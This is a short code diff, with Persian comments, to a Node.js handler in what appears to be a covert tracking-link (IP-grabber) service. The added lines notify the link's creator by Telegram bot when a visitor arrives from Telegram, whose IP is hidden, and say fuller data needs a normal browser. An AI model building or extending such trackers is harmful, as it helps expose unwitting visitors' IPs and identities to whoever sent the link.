@@ -51,6 +51,12 @@ module.exports = async (req, res) => {
     if (userInfo.isTelegram) {
         console.log('⚠️ کاربر از تلگرام آمده - IP مخفی است:', req.connection.remoteAddress);
         
+        // ارسال پیام به سازنده لینک که کسی از تلگرام کلیک کرده
+        bot.api.sendMessage(
+            creatorId, 
+            `⚠️ کسی از تلگرام روی لینک شما (${linkId}) کلیک کرد.\n\n💡 برای دریافت اطلاعات کامل، لینک باید از مرورگر معمولی باز شود.`
+        ).catch(e => console.error("Error sending Telegram notification:", e));
+        
         // صفحه اخطار نمایش بده
         const warningHtml = `
         <!DOCTYPE html>
